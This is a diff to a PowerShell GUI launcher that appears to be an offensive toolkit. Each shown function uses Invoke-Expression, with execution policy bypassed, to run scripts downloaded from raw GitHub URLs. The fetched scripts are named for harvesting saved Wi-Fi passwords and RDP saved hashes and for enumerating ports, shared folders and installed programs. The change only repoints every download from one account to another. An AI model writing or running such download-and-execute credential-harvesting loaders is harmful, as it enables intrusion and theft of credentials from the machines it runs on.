@@ -109,12 +109,12 @@ $form.Controls.Add($buttonExit)
 
 # Helper function to run scripts and return the result as an array of lines
 function Run-Script1 {
-    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content)"
+    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/WLAN-PSW-Finder.ps1').Content)"
     return $result -split "`n"  # Split the result into an array of lines
 }
 
 function Run-Script2 {
-    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/RetrieveRDPSavedHash.ps1').Content)"
+    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/RetrieveRDPSavedHash.ps1').Content)"
     return $result -split "`n"  # Split the result into an array of lines
 }
 
@@ -127,19 +127,19 @@ function Run-Script0 {
 # Define individual script functions for options 3, 4, and 5
 function Run-Script3 {
     # Start the "Port-Discovery.ps1" script
-    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/Port-Discovery.ps1').Content)"
+    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/Port-Discovery.ps1').Content)"
     return $result -split "`n"  # Split the result into an array of lines
 }
 
 function Run-Script4 {
     # Start the "SharedFolder.ps1" script
-    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/SharedFolder.ps1').Content)"
+    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/SharedFolder.ps1').Content)"
     return $result -split "`n"  # Split the result into an array of lines
 }
 
 function Run-Script5 {
     # Start the "ProgramLister.ps1" script
-    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/ProgramLister.ps1').Content)"
+    $result = powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pemar95/Scripts/main/ProgramLister.ps1').Content)"
     return $result -split "`n"  # Split the result into an array of lines
 }
 
